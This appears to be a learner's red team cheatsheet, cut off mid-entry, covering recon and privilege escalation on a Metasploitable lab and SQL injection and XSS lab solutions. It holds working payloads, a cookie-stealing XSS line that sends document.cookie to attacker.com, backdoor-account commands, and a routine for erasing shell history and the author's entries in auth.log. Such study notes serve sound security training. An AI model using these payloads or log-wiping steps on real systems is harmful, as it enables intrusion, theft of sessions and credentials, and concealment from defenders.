MY RED TEAM CHEATSHEET
Ahmed Ezzat
Last Updated: August 2026

STATUS TAGS
[DONE]    = i practiced this, i can do it from memory
[TAUGHT]  = i understand it but need more practice
[STAGE 3] = i will learn this in exploitation stage
[STAGE 4] = i will learn this in Active Directory stage

======================================================
LINUX
======================================================

Find SUID binaries: [DONE]
find / -perm -4000 2>/dev/null
what i learned: finds files that run as root no matter who runs them
why it matters: these are my privesc targets in Stage 3

Find SUID binaries owned by root that are world-executable: [DONE]
find / -perm -4000 -perm -o+x -user root 2>/dev/null
what i learned: more specific search — filters to root-owned SUID files only

Find writable files: [DONE]
find / -writable -type f 2>/dev/null
what i learned: finds files anyone can write to
why it matters: if a root-owned script is writable i can edit it

Find world-writable files excluding /proc: [DONE]
find / -perm -002 -type f -user root 2>/dev/null | grep -v /proc
find / -perm -002 -type d 2>/dev/null | grep -v /proc
what i learned: /proc is a virtual filesystem — always shows writable, ignore it
why it matters: real writable files/dirs are actual privesc paths

Find files containing password: [DONE]
grep -r "password" /etc/ 2>/dev/null
what i learned: searches inside every file in /etc/ for the word password
why it matters: admins sometimes leave credentials in config files

Find PHP files containing password in web root: [DONE]
find /var/www -name "*.php" | xargs grep -l "password" 2>/dev/null
what i learned: finds all PHP files in web server directory containing password
why it matters: web app config files often have hardcoded database credentials

List users with real shells: [DONE]
cat /etc/passwd | grep "/bin/bash"
what i learned: filters to only accounts using bash — almost always real humans
real targets: root, msfadmin, postgres, user, service
system noise: daemon, bin, www-data, nobody — ignore these
why it matters: shows me which accounts i can actually target

Live log monitoring: [DONE]
tail -f /var/log/auth.log
what i learned: watches the auth log update in real time
why it matters: i saw my own SSH login appear here live

Failed SSH attempts: [DONE]
grep "Failed password" /var/log/auth.log
what i learned: pulls every failed login with source IP and timestamp
why it matters: shows me if someone is brute forcing a machine

Successful SSH logins: [DONE]
grep "Accepted" /var/log/auth.log
what i learned: shows every successful login
why it matters: my IP appears here every time i SSH in

Check cron jobs: [DONE]
crontab -l
cat /etc/crontab
what i learned: crontab -l shows my user cron jobs
               cat /etc/crontab shows system wide jobs
               format is: minute hour day month weekday user command
               * means every — so * in hour means every hour
what i found on Metasploitable:
               17 * * * * root — runs cron.hourly scripts every hour at minute 17
               25 6 * * * root — runs cron.daily scripts every day at 6:25am
               47 6 * * 7 root — runs cron.weekly scripts every Sunday at 6:47am
               52 6 1 * * root — runs cron.monthly scripts every 1st at 6:52am
why it matters: if a root cron job runs a script i can write to
               i edit that script and it executes as root — instant privesc

Disable history: [DONE]
unset HISTFILE && export HISTSIZE=0
what i learned: unset HISTFILE stops bash writing history to disk
               export HISTSIZE=0 clears memory of commands in session
why it matters: first thing i run after getting a shell so nothing gets logged

Clear history file: [DONE]
cat /dev/null > ~/.bash_history
what i learned: /dev/null is empty — piping it overwrites the file with nothing
why it matters: clears commands typed before i disabled history

Surgical log clean: [DONE]
sudo sed -i '/192.168.56.102/d' /var/log/auth.log
sudo sed -i '/msfadmin/d' /var/log/auth.log
what i learned: sed processes text line by line
               -i edits the file directly
               /pattern/d deletes every line containing that pattern
why it matters: removes only my entries — rest of log stays normal
               full wipe is obvious to defenders, surgical is not
important: use exact IP not partial match
           some session lines have no IP — also clean by username
           always verify with grep after cleaning

Find private keys on target: [DONE]
find / -name "id_rsa" 2>/dev/null
find / -name "*.pem" 2>/dev/null
find / -name "*.key" 2>/dev/null
what i found on Metasploitable:
               /home/msfadmin/.ssh/id_rsa — private SSH key
               /etc/mysql/server-key.pem  — MySQL SSL key
               /etc/mysql/client-key.pem  — MySQL client key
               /etc/bind/rndc.key         — DNS key
why it matters: private SSH key can be copied and used to access
               other servers that trust this key — no password needed

Read shadow file: [DONE]
sudo cat /etc/shadow
hashing algorithm prefixes:
$1$ = MD5 — weak, crackable fast
$5$ = SHA-256 — stronger
$6$ = SHA-512 — strongest
Metasploitable uses MD5 — crackable in Stage 3 with hashcat
crack online: crackstation.net — paste the hash only, not the full line

Full OPSEC routine — do this every session: [DONE]
1. SSH into target
2. unset HISTFILE && export HISTSIZE=0
3. do your work
4. cat /dev/null > ~/.bash_history
5. sudo sed -i '/192.168.56.102/d' /var/log/auth.log
6. sudo sed -i '/msfadmin/d' /var/log/auth.log
7. verify: grep "192.168.56.102" /var/log/auth.log
8. history — should return nothing
9. exit

======================================================
STAGE 3 PRIVESC TARGETS — METASPLOITABLE SUID BINARIES
======================================================

/usr/bin/nmap — EXPLOITABLE
method: nmap --interactive then !sh = root shell
reason: nmap runs as root via SUID, interactive mode spawns shell
use in Stage 3: confirmed privesc path

/usr/bin/sudo — CHECK RULES
method: sudo -l then look for misconfigured commands
reason: if any command runs as root without password = escalation path
use in Stage 3: run sudo -l first on every compromised machine

/usr/lib/pt_chown — LEGACY
method: old glibc exploit, version dependent
reason: historically used for terminal device ownership
use in Stage 3: try if other methods fail

/usr/bin/at — SCHEDULE AS ROOT
method: echo "chmod +s /bin/bash" | at now
reason: at runs scheduled jobs as root when SUID
use in Stage 3: schedule malicious command to run as root

all others: no reliable general exploit path on this version

======================================================
CREDENTIALS FOUND ON METASPLOITABLE
======================================================

DVWA database config — /var/www/dvwa/config/config.inc.php:
db_server:   localhost
db_database: dvwa
db_user:     root
db_password: (empty)

TikiWiki database config — /var/www/tikiwiki/db/tiki-db.php:
host_tiki:  localhost
user_tiki:  root
pass_tiki:  (empty)
dbs_tiki:   tiki

Tomcat credentials — /etc/tomcat5.5/tomcat-users.xml:
username: tomcat  password: tomcat  roles: admin,manager
username: both    password: tomcat

MySQL direct access: root with no password
VNC default password: password — gives root GUI desktop

======================================================
WINDOWS
======================================================

Navigate directories: [DONE]
cd foldername
what i learned: same as Linux cd, works in both CMD and PowerShell

List folder contents: [DONE]
dir
what i learned: Windows CMD equivalent of ls
               in PowerShell i can use ls or Get-ChildItem

File and folder permissions: [DONE]
icacls C:\path\to\file
what i learned: shows who has what permissions on a file or folder
why it matters: misconfigured permissions are a privesc path in Stage 3

Create new user: [DONE]
New-LocalUser
what i learned: PowerShell prompts me for -Name and -Password automatically
               i dont need to memorize the full syntax
               PowerShell IntelliSense suggests parameters as i type
why it matters: attackers create backdoor accounts after compromising a machine
CMD alternative: net user username password /add

PowerShell aliases: [DONE]
Get-Alias
what i learned: shows all command shortcuts in PowerShell
               ls is an alias for Get-ChildItem
               cd is an alias for Set-Location

======================================================
NETWORKING
======================================================

Standard recon scan: [DONE]
nmap -sV -sC TARGET_IP
what i learned: -sV detects service versions, -sC runs default scripts
always run both together for full picture

Full port scan: [DONE]
nmap -p- TARGET_IP
what i learned: scans all 65535 ports not just top 1000

Ping sweep: [DONE]
nmap -sn 192.168.56.0/24
what i learned: finds live hosts without port scanning
always run this first to confirm Metasploitable IP before every session

Stealth scan: [STAGE 3]
nmap -sS TARGET_IP
what i learned: sends SYN but never completes the handshake
               harder to detect than a full TCP connect scan
               needs root to run

Script scan: [DONE]
nmap -sC TARGET_IP
what i learned: runs default scripts against open ports
extra info it revealed on Metasploitable:
- port 21 — anonymous FTP login allowed, no password needed
- port 25 — VRFY enabled, can enumerate valid usernames
- port 25 — SSLv2 supported, broken encryption, cert expired 2010
- port 111 — NFS shares exposed on port 2049
- port 139 — SMB guest access allowed, message signing disabled
- machine name: metasploitable, domain: localdomain
why it matters: finds vulnerabilities that -sV misses completely

Banner grab with netcat: [DONE]
nc TARGET_IP PORT
what i learned: connects to a port and reads whatever the service sends back

Send raw HTTP GET: [DONE]
nc TARGET_IP 80
then type: GET / HTTP/1.0 and press Enter twice
what it revealed on Metasploitable:
- Apache 2.2.8 Ubuntu — old version
- PHP 5.2.4 — ancient, multiple exploits
- WebDAV enabled — file upload possible
- web apps: phpMyAdmin, DVWA, Mutillidae, TWiki, WebDAV

Manual FTP with netcat: [DONE]
nc TARGET_IP 21
USER anonymous    → 331 password required
PASS anonymous@   → 230 login successful
PWD               → 257 current directory
STOR file.txt     → 425 use PORT or PASV first
QUIT              → 221 goodbye
note: LIST and STOR require a data channel — netcat only has control channel
FTP response codes:
220 = service ready
331 = username ok, password required
230 = login successful
257 = pathname shown
425 = cannot open data connection
550 = file unavailable or permission denied
553 = cannot create file
221 = goodbye

SMTP username enumeration: [DONE]
nc TARGET_IP 25
VRFY username
252 = user exists
550 = user does not exist
confirmed on Metasploitable: root, msfadmin, user, bin, daemon, sys exist
admin does not exist

Capture traffic: [DONE]
wireshark

Filter by IP in Wireshark: [DONE]
ip.addr == TARGET_IP

Filter FTP in Wireshark: [DONE]
ip.addr == TARGET_IP && ftp

Follow TCP Stream in Wireshark: [DONE]
right click any packet → Follow → TCP Stream
shows entire conversation as readable text

File transfer via Python HTTP server: [DONE]
on Kali:   python3 -m http.server 8080
on target: wget http://192.168.56.102:8080/filename

File transfer via netcat send: [DONE]
nc TARGET_IP 4444 < file.txt

File transfer via netcat receive: [DONE]
nc -lvp 4444 > file.txt

Check routing table: [DONE]
route -n
default gateway:  10.0.2.1    via eth1 — internet
lab network:      192.168.56.0 via eth0 — direct to Metasploitable

Check ARP table: [DONE]
arp -a

MySQL direct access: [DONE]
mysql -h 192.168.56.104 -u root --skip-ssl
no password required — critical misconfiguration
databases found: dvwa, metasploit, mysql, owasp10, tikiwiki
dvwa admin hash: 5f4dcc3b5aa765d61d8327deb882cf99 = "password"

VNC access: [DONE]
vncviewer 192.168.56.104
default password: password
result: root GUI desktop — no exploit needed

Bindshell instant root: [DONE]
nc 192.168.56.104 1524
result: root@metasploitable:/# — instant root shell

rexec service: [DONE]
nc TARGET_IP 512
banner: Where are you?
what it does: remote command execution with cleartext credentials
why dangerous: no encryption — credentials captured by Wireshark
               executes commands on remote machine
use in Stage 3: exploit with Metasploit auxiliary module

rlogin service: [DONE]
port 513 TCP
nc connects but rlogin requires specific client protocol to interact
use: rlogin -l username 192.168.56.104
dangerous because:
- no encryption — all traffic visible in Wireshark
- trust via .rhosts files — no password if your IP is trusted
- obsolete — replaced by SSH
find .rhosts files: find / -name ".rhosts" 2>/dev/null
if .rhosts exists with your IP — rlogin connects with no password

rlogin exploitation: [DONE]
rlogin -l username TARGET_IP
connected as msfadmin with no password — trust relationship active
.rhosts files found:
  /home/msfadmin/.rhosts
  /root/.rhosts
read contents: cat /home/msfadmin/.rhosts
if Kali IP listed — passwordless login confirmed
critical: if /root/.rhosts trusts our IP — rlogin -l root gives root shell
.rhosts contents: + +
meaning: trust ALL hosts, trust ALL users — no authentication required
impact: anyone can rlogin as any user including root with no password
this is the most dangerous .rhosts configuration possible

SSH vs FTP traffic comparison: [DONE]
SSH: all traffic encrypted — Wireshark shows binary gibberish
     credentials, commands, responses — all unreadable to sniffer
FTP: all traffic plaintext — Wireshark shows everything
     USER command visible, PASS command visible, all data readable
conclusion: SSH replaced Telnet and FTP precisely because of this
            any protocol without encryption is dangerous on shared networks

======================================================
SSH
======================================================

Basic connect: [DONE]
ssh user@IP

Connect with private key: [DONE]
ssh user@IP -i keyfile

Connect on custom port: [DONE]
ssh user@IP -p 2222

Connect to old server with RSA key: [DONE]
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa user@IP

Generate key pair: [TAUGHT]
ssh-keygen -t rsa -b 4096

Copy public key to target: [TAUGHT]
ssh-copy-id user@IP

Port forwarding: [STAGE 4]
ssh -L localport:target:targetport user@IP

Brute force SSH: [STAGE 3]
hydra -l user -P wordlist ssh://IP

======================================================
PROXYCHAINS AND TOR
======================================================

Start TOR: [DONE]
sudo service tor start

Verify IP changed: [DONE]
proxychains curl ifconfig.me

Run any tool through TOR: [DONE]
proxychains TOOL OPTIONS

Config file: /etc/proxychains4.conf

======================================================
MY PYTHON TOOLS — BUILT FROM SCRATCH
======================================================

Single port checker:       python3 ~/red-team-tools/python-tools/single_port_checker.py
Port scanner:              python3 ~/red-team-tools/python-tools/port_scanner.py
Banner grabber:            python3 ~/red-team-tools/python-tools/banner_grabber.py
Full recon tool:           python3 ~/red-team-tools/python-tools/recon.py
Advanced recon tool:       python3 ~/red-team-tools/python-tools/recon_advanced.py
Scanner with args:         python3 ~/red-team-tools/python-tools/scanner.py TARGET_IP
Multi-service checker:     python3 ~/red-team-tools/python-tools/multi-service-checker.py
Anonymous FTP checker:     python3 ~/red-team-tools/python-tools/check_anonymous_ftp.py
Port and targets scanner:  python3 ~/red-team-tools/python-tools/port_and_targets/main.py
Timestamped scanner:       python3 ~/red-team-tools/python-tools/port_scanner/scanner.py TARGET_IP
Vulnerability report:      python3 ~/red-team-tools/python-tools/vulnerability_report.py
Service markdown report:   python3 ~/red-team-tools/python-tools/service_report.py

======================================================
MY LAB
======================================================

Metasploitable IP:  192.168.56.104
Kali IP:            192.168.56.102
Credentials:        msfadmin / msfadmin (FTP, SSH, Telnet)

Vulnerabilities to exploit in Stage 3:
vsftpd 2.3.4   port 21   backdoor — instant root shell
Samba 3.0.20   port 139  usermap_script — instant root shell
UnrealIRCd     port 6667 backdoor — instant root shell
Bindshell      port 1524 already open — netcat = instant root
nmap SUID             — nmap --interactive then !sh = root shell

======================================================
SERVICES I FOUND ON METASPLOITABLE
======================================================

Port 21   FTP         vsftpd 2.3.4        CRITICAL
Port 22   SSH         OpenSSH 4.7p1       HIGH
Port 23   Telnet      plaintext login     HIGH
Port 25   SMTP        Postfix             MEDIUM
Port 53   DNS         BIND 9.4.2          MEDIUM
Port 80   HTTP        Apache 2.2.8        HIGH
Port 111  RPC                             LOW
Port 139  SMB         Samba 3.0.20        CRITICAL
Port 445  SMB         Samba 3.0.20        CRITICAL
Port 512  rexec       cleartext RCE       HIGH
Port 513  rlogin                          HIGH
Port 514  rsh                             HIGH
Port 1099 Java RMI                        MEDIUM
Port 1524 Bindshell   root shell open     CRITICAL
Port 2049 NFS                             MEDIUM
Port 2121 FTP         ProFTPD 1.3.1       HIGH
Port 3306 MySQL       5.0.51a             HIGH
Port 5432 PostgreSQL  8.3.0               HIGH
Port 5900 VNC         protocol 3.3        HIGH
Port 6667 IRC         UnrealIRCd          CRITICAL
Port 8180 Tomcat      Apache Tomcat       HIGH
Port 8787 Metasploit  backdoor listener   CRITICAL
Port 3632 distccd     compiler daemon RCE HIGH

======================================================
WEB APP SECURITY — SQL INJECTION
======================================================

What SQLi is:
attacker interferes with SQL queries an app makes to its database
single quote ' is the key character — breaks out of string context
-- comments out rest of query

What SQL is:
language used to talk to databases
every login runs a query like:
SELECT * FROM users WHERE username='ahmed' AND password='1234'

Basic login bypass:
username field input: admin'--
query becomes: SELECT * FROM users WHERE username='admin'--' AND password=''
password check is commented out — logged in as admin without password

Why ' works:
SQL strings are wrapped in single quotes
injecting ' breaks out of the string and lets you write your own SQL

Types of SQLi:
IN-BAND — attack and result use same channel
  Error-based  — force DB errors to reveal version and structure info
  Union-based  — combine queries with UNION to pull extra data from DB
INFERENTIAL (BLIND) — no data transferred directly
  Boolean-based — send true/false conditions, observe page differences
  Time-based    — send sleep command, observe response delay
OUT-OF-BAND — DB sends data to attacker external server via DNS/HTTP

Key SQL vocabulary:
SELECT * FROM users     — get all data from users table
WHERE username='ahmed'  — filter condition
AND / OR                — combine conditions
'                       — breaks string context
--                      — comments out rest of query
UNION                   — combines two query results into one
ORDER BY 1,2,3          — used to detect number of columns
NULL                    — used in column count detection

Finding SQLi:
submit ' and look for errors or behavior changes
submit '' and see if error disappears

Column count detection:
ORDER BY 1 — works
ORDER BY 2 — works
ORDER BY 3 — error = 2 columns exist

UNION attack requires:
1. column count
2. compatible data types
3. UNION SELECT to pull target data

Prevention:
parameterized queries — prepared statements
input validation, WAF, least privilege DB accounts

DATABASE VERSION QUERIES
Oracle:     SELECT banner FROM v$version
MySQL:      SELECT @@version
PostgreSQL: SELECT version()
MSSQL:      SELECT @@version

IDENTIFY DATABASE TYPE
Oracle:     FROM dual works
MySQL:      # works as comment
PostgreSQL: SELECT version() works
MSSQL:      SELECT @@version works

URL ENCODING
' = %27   space = %20
REFERENCE: portswigger.net/web-security/sql-injection/cheat-sheet

information_schema — built-in database map (not Oracle)
information_schema.tables  — all table names
information_schema.columns — all column names per table
Oracle: all_tables / all_columns

Lab 01 — WHERE clause hidden data retrieval — DONE
payload: ' or 1=1--
why: OR 1=1 always true, -- comments out AND released=1

Lab 02 — Login bypass — DONE
payload: administrator'-- in username field
why: -- comments out password check entirely

Lab 03 — Oracle version extraction — DONE
payload: ' UNION SELECT banner,NULL FROM v$version--

Lab 04 — MySQL/MSSQL version extraction — DONE
payload: ' UNION SELECT @@version,NULL--%20
note: MySQL comment needs space after -- so use --%20

Lab 05 — Database contents extraction — DONE
1. ORDER BY to find column count
2. UNION SELECT 'test',NULL to find text column
3. ' UNION SELECT table_name,NULL FROM information_schema.tables--
4. ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='target'--
5. ' UNION SELECT username_col,password_col FROM target_table--

Lab 06 — Oracle database contents — DONE
list tables:   ' UNION SELECT table_name,NULL FROM all_tables--
list columns:  ' UNION SELECT column_name,NULL FROM all_columns WHERE table_name='TARGET'--
dump data:     ' UNION SELECT col1,col2 FROM target_table--

Lab 07 — Column count with NULL — DONE
add NULLs until page loads: ' UNION SELECT NULL,NULL,NULL--

Lab 08 — Finding text columns — DONE
replace each NULL with 'test' until page loads without error

Lab 09 — Retrieving table data — DONE
payload: ' UNION SELECT username,password FROM users--

Lab 10 — Multiple values in single column — DONE
payload: ' UNION SELECT NULL,CONCAT(username,':',password) FROM users--
PostgreSQL: username||':'||password

Lab 11 — Blind SQLi boolean-based — DONE
feedback: Welcome back = TRUE, no Welcome back = FALSE
inject into tracking cookie
1. confirm: ' AND 1=1-- vs ' AND 1=2--
2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
4. extract: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POS,1)='CHAR'--
Burp Intruder cluster bomb: payload1=positions 1-20, payload2=a-z 0-9, grep=Welcome back

Lab 12 — Blind SQLi conditional errors — Oracle — DONE
feedback: server error = TRUE, normal page = FALSE
confirm: ' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a'--
extract: ' AND (SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a'--
key: CASE WHEN = SQL if/else, TO_CHAR(1/0) = divide by zero error

Lab 13 — Blind SQLi time delays — DONE
PostgreSQL: '|| (SELECT pg_sleep(10))--
identify database: test all four, whichever delays = that database

Lab 14 — Blind SQLi time-based retrieval — DONE
'||(SELECT CASE WHEN (username='administrator' AND SUBSTR(password,POS,1)='CHAR') THEN pg_sleep(4) ELSE pg_sleep(0) END FROM users)--
delay = correct character

======================================================
WEB APP SECURITY — XSS (CROSS-SITE SCRIPTING)
======================================================

What XSS is:
attacker injects malicious JavaScript into a trusted website
browser executes it thinking it came from the trusted site
target is the victim's browser, not the server

JavaScript basics needed:
alert(1)              — popup, basic proof of concept
document.cookie       — all browser cookies for the site
document.domain       — domain name, used to confirm XSS in labs
fetch('url')          — HTTP request, used to exfiltrate data
<script>code</script> — executes JavaScript

Types of XSS:
REFLECTED  — payload in URL, server reflects it back once
             only affects users who click the malicious link
STORED     — payload saved to database, fires for every visitor
             most dangerous type
DOM-BASED  — vulnerability in client-side JavaScript
             server never sees the payload
             page's own JS writes unsanitized input into the DOM

Standard payloads:
basic:          <script>alert(1)</script>
img onerror:    <img src=x onerror=alert(1)>
svg onload:     <svg onload=alert(1)>
attribute:      " autofocus onfocus=alert(1) x="
javascript URL: javascript:alert(document.cookie)
cookie steal:   <script>fetch('https://attacker.com?c='+document.cookie)</script>

Lab goal: make alert(document.domain) execute in the browser

HTML contexts and matching payloads:
between tags:     <p>INPUT</p>          → <script>alert(1)</script>
inside attribute: <input value="INPUT"> → "><script>alert(1)</script>
inside JS string: var x='INPUT'         → ';alert(1)//
inside href:      <a href="INPUT">      → javascript:alert(document.cookie)
innerHTML sink:   JS writes INPUT to DOM → script tags BLOCKED
                                         → use <img src=x onerror=alert(1)>

Key concepts:
innerHTML blocks script tags — use event handlers instead
onerror   — fires when resource fails to load (img, script)
onload    — fires when resource loads successfully
onfocus   — fires when element receives focus
onmouseover — fires when mouse moves over element
onhashchange — fires when URL # fragment changes
autofocus — forces element to receive focus on page load
           combine with onfocus for automatic execution without user interaction

jQuery $() in old versions:
input starting with < treated as HTML — creates DOM elements
input not starting with < treated as CSS selector
attacker passes HTML payload starting with < to create elements

location.hash:
the # part of URL — browser never sends to server
attacker controls by crafting malicious URL
hashchange event fires when it changes

XSS testing methodology:
1. find every input point
2. submit unique test string: xsstest123
3. view page source Ctrl+U — search for xsstest123
4. identify HTML context surrounding your string
5. identify which parser interprets input — HTML, JS engine, jQuery, framework
6. determine if breakout required
7. pick payload matching context
8. if blocked — try alternative tags/events, try URL encoding
9. confirm: alert(document.domain) fires = XSS confirmed

XSS structured analysis for every lab:
vulnerability type / source / sink / execution context /
which parser / need breakout / reasoning / why it exists /
how to prevent / attacker impact

Real bug bounty universal probe:
"><img src=x onerror=alert(1)>

XSS prevention:
output encoding — convert < to &lt; and > to &gt;
CSP header — restrict which scripts browser executes
input validation — reject dangerous characters at input

XSS delivery methods:
reflected:      craft malicious URL, send to victim
stored:         submit payload into stored field
DOM:            craft malicious URL with payload in parameter or hash
exploit server: host iframe page, deliver to victim

======================================================
XSS LABS
======================================================

Lab 01 XSS — Reflected XSS in HTML context — DONE
type: reflected
source: search parameter
sink: HTML page response
context: HTML text — data state
breakout: no
payload: <script>alert(1)</script>
why it exists: user input reflected into HTML without encoding
fix: HTML encode output before rendering
attacker impact: steal session cookies, redirect victim, execute actions as victim

Lab 02 XSS — Stored XSS in HTML context — DONE
type: stored
source: comment field
sink: stored in database, rendered in page
context: HTML text — data state
breakout: no
payload: <script>alert(1)</script>
why it exists: stored user input rendered into HTML without encoding
fix: HTML encode output before rendering, validate on submission
attacker impact: mass account takeover — fires for every visitor

Lab 03 XSS — DOM XSS via document.write — DONE
type: DOM
source: window.location.search
sink: document.write()
context: double-quoted attribute value state
breakout: yes — close attribute with "
payload: "><svg onload=alert(1)>
why it exists: document.write() used with unsanitized user input
fix: avoid document.write() — use textContent
attacker impact: executes in victim browser on page load

Lab 04 XSS — DOM XSS via innerHTML — DONE
type: DOM
source: window.location.search
sink: element.innerHTML
context: HTML text after innerHTML assignment
breakout: no
script tags: BLOCKED by browser in innerHTML
payload: <img src=0 onerror="alert(1)">
why it exists: innerHTML used with unsanitized user input
fix: use textContent instead of innerHTML
attacker impact: executes when victim loads crafted URL

Lab 05 XSS — DOM XSS in jQuery href attribute — DONE
type: DOM
source: window.location.search returnPath parameter
sink: jQuery .attr('href')
context: URL context — full href value controlled
breakout: no — attacker controls entire href value
payload: javascript:alert(document.cookie)
why it exists: untrusted input assigned to href without URL validation
fix: validate URL scheme — only allow http: https: and relative URLs
attacker impact: steals cookies when victim clicks the back link

Lab 06 XSS — DOM XSS via jQuery hashchange — DONE
type: DOM
source: window.location.hash
sink: jQuery $() selector — jQuery 1.8.2
context: jQuery selector context
interpreter: jQuery 1.8.2 selector engine
breakout: yes — escape selector with HTML starting with 
payload in hash: <img src=x onerror=print()>
delivery: iframe with onload appending hash after page loads
final exploit: <iframe src="LAB-URL" onload="this.src+='#<img src=x onerror=print()>'"></iframe>
why onload needed: hashchange only fires when hash changes, not on initial load
why it exists: outdated jQuery, untrusted location.hash passed to $()
fix: upgrade jQuery, never pass untrusted input to $()
attacker impact: fires in victim browser when they visit exploit page

Lab 07 XSS — Reflected XSS into HTML attribute — DONE
type: reflected
source: search parameter
sink: value attribute of input element
context: double-quoted HTML attribute value state
encoding: angle brackets encoded, quotes NOT encoded
breakout: yes — use " to close attribute value
key insight: onclick requires interaction
             autofocus + onfocus = automatic execution without user click
payload: " autofocus onfocus="alert(1)
why it exists: quotes not encoded allows attribute breakout
fix: encode all special characters including quotes in attribute context
attacker impact: executes automatically when victim loads crafted URL

Lab 08 XSS — Stored XSS in href attribute — DONE
type: stored
source: website field in comment form
sink: href attribute of author link
context: URL context — entire href controlled
encoding: double quotes encoded — irrelevant, no breakout needed
breakout: no
payload: javascript:alert(1)
why it exists: dangerous URL schemes not validated
fix: allowlist only https: http: and relative URLs
attacker impact: executes when any visitor clicks the author link

Lab 09 XSS — Reflected XSS into JavaScript string — DONE
type: reflected
source: search parameter
sink: JavaScript string variable assignment — var searchTerms = 'USER_INPUT'
context: JavaScript string context — single-quoted
encoding: angle brackets encoded — irrelevant in JS context
interpreter: JavaScript parser
breakout: yes — use ' to close the string
payload: ';alert(1);//
reasoning:
  ' closes the JavaScript string
  ; terminates the current statement
  alert(1); injects new JavaScript
  // comments out remainder
why it exists: user input concatenated into JavaScript string without JS escaping
fix: JSON-encode user data when embedding in JavaScript
attacker impact: executes in victim browser on page load

Lab 10 XSS — DOM XSS inside select element — DONE
type: DOM
source: storeId URL parameter
sink: document.write() inside option element
context: HTML text inside option element
breakout: yes — close option and select elements first
payload: </option></select><img src=x onerror=alert(1)>
reasoning: HTML inside option treated as content
           must escape both option and select before injecting
why it exists: document.write() used with unsanitized user input
fix: use createElement and textContent instead of document.write()
attacker impact: executes in victim browser on page load

Lab 11 XSS — DOM XSS via AngularJS expression — DONE
type: DOM
source: search parameter
sink: AngularJS expression evaluator
context: AngularJS expression context — inside ng-app scope
interpreter: AngularJS expression parser
encoding: angle brackets and quotes encoded — irrelevant
breakout: no — already inside expression context
detection: inject {{7*7}} — if page shows 49 = AngularJS evaluating expressions
payload: {{$on.constructor('alert(1)')()}}
note: looked at solution — AngularJS sandbox escape requires framework knowledge
why it exists: untrusted input evaluated as AngularJS expression
fix: never evaluate user input as framework expressions
attacker impact: executes arbitrary JavaScript in victim browser

key concept — template injection:
when framework evaluates user input as expressions
{{}} is AngularJS expression delimiter
$on.constructor accesses Function constructor to execute arbitrary JS
this is a sandbox escape technique specific to AngularJS

Lab 12 XSS — Reflected DOM XSS via eval() — DONE
type: reflected DOM XSS
source: window.location.search
sink: eval('var searchResultsObj = ' + this.responseText)
context: JavaScript string value inside JSON object
interpreter: JavaScript engine — eval()
encoding: server escapes " as \" and \ as \\
breakout: yes — use \ to escape the escape character before "
payload: \"};alert(1);//
reasoning:
  \ escapes the server's escape character
  " then terminates the JavaScript string
  }; closes the JSON object and statement
  alert(1); injects new JavaScript
  // comments out remainder
key insight: vulnerability in client-side JS logic, not HTML page
             inspect AJAX responses in Burp, not just page source
             eval() executes anything — never use it with untrusted data
why it exists: eval() used to process JSON instead of JSON.parse()
fix: replace eval() with JSON.parse() — parses without executing
attacker impact: executes arbitrary JavaScript in victim browser

Lab 13 XSS — Stored DOM XSS via broken escaping — DONE
type: stored DOM XSS
source: comment field
sink: innerHTML after escapeHTML() function
context: HTML context — innerHTML
interpreter: HTML parser
encoding: custom escapeHTML() replaces only FIRST < and >
           uses string replace not regex — only first occurrence affected
breakout: no — just bypass the broken sanitization
bypass technique: prepend <> to consume the escaping budget
                  real payload follows unescaped
payload: <><img src=x onerror=alert(1)>
code analysis:
  html.replace('<','&lt;') — replaces first < only
  html.replace('>','&gt;') — replaces first > only
  remaining tags left unescaped — browser executes them
why it exists: incorrect manual sanitization — string replace not global regex
fix: use /</g and />/g regex for global replacement
     better: use textContent instead of innerHTML
     better: use DOMPurify if HTML rendering required
attacker impact: fires for every visitor who views the comment

Lab 14 XSS — Reflected XSS with WAF bypass — DONE
type: reflected XSS
source: search parameter
sink: HTML response
context: HTML context
WAF: blocks most common tags and attributes
breakout: no — already in HTML context

WAF bypass methodology:
1. test common tags — identify which ones are blocked
2. use Burp Intruder to fuzz all HTML tags — find allowed ones
3. use Burp Intruder to fuzz all event handlers on allowed tag
4. identify event that fires without user interaction
5. engineer trigger mechanism if event needs external cause

allowed tag: <body>
allowed event: onresize
why onresize: fires when viewport/iframe dimensions change
              can be triggered programmatically without user interaction

trigger mechanism: iframe that changes its own width on load
outer exploit page forces resize of inner iframe
resize event fires inside iframe — onresize executes

final payload injected: <body onresize=print()>
URL encoded for search parameter:
%3Cbody%20onresize%3Dprint%28%29%3E

delivery exploit:
<iframe width="50px"
        onload="this.style.width='100px'"
        src="LAB-URL/?search=%3Cbody%20onresize%3Dprint%28%29%3E">
</iframe>

attack flow:
exploit server → iframe loads lab → width changes on load →
resize event fires → onresize=print() executes → lab solved

URL encoding reference:
< = %3C    > = %3E    space = %20
= = %3D    ( = %28    ) = %29

key lesson: WAF is not a fix for XSS — proper output encoding is
            WAFs block known patterns — creative combinations bypass them
            enumerate what is allowed, not just what is blocked

why it exists: WAF used as primary defense instead of output encoding
fix: context-aware output encoding — WAF as additional layer only
attacker impact: fires in victim browser without any interaction required

Lab 15 XSS — Reflected XSS with custom tags allowed — DONE
type: reflected XSS
source: search parameter
sink: HTML response
context: HTML context
WAF: blocks standard HTML tags — allows custom/unknown elements
breakout: no — inject directly as custom element

custom element technique:
<xss id=x onfocus=alert(document.cookie) tabindex=1>
tabindex=1 — makes element focusable
id=x — allows targeting via URL fragment #x
onfocus — fires when element receives focus

delivery: location redirect to lab URL with #x fragment
          #x causes browser to focus element with id=x
          onfocus fires automatically — no user interaction

exploit server payload:
<script>location = 'LAB_URL/?search=<xss id=x onfocus=alert(document.cookie) tabindex=1>#x';</script>

why iframe failed: application refused to load inside iframe
fix: use location redirect instead of iframe

key lesson: blacklists that block standard tags still allow custom elements
            browsers treat unknown elements as valid inline elements
            any element can have event handlers regardless of whether it is standard HTML

why it exists: blacklist-based WAF — no contextual output encoding
fix: encode all user input before inserting into HTML context

Lab 16 XSS — Reflected XSS via SVG animateTransform — DONE
type: reflected XSS
source: search parameter
